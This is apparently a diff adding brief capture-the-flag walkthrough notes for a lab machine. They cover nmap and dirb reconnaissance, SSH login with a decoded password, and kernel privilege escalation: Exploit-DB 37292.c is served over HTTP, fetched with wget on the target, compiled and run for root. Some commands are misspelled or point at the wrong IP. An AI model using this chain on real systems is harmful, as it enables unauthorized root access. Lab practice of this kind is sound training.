@@ -1,0 +1,46 @@
+IP 192.168.76.145
+nmap -sn 192.168.76.0/24
+nmap -sV -p 22,80 -sV vuln 192.168.76.145 -A
+
+Access website
+have look in source code
+you will get the username 
+
+
+dirb http://192.168.76.145
+http://192.168.76.145/robots.txt
+get code and encode
+this is might be password
+lets access 
+ssh username@192.168.x.x 
+Password decoded string
+
+great you logged in 
+ls
+there is interesting file flag2.txt
+
+open it 
+decode again
+bin string
+
+https://dencode.com/en/string/bin
+
+Privilege escalation 
+uname -a on Target machine
+searchsploit Linux 3.13.0
+
+locate linux/local/37292.c
+cp /usr/share/exploitdb/exploits/linux/local/37292.c .
+└─$ pyhton2 -m SimpleHTTPserver 1234
+
+on target machine
+wget http://192.168.76.145:1234/37292.c
+gcc 37292.c -o exploit
+./exploit
+
+root access
+verify
+
+
+
+
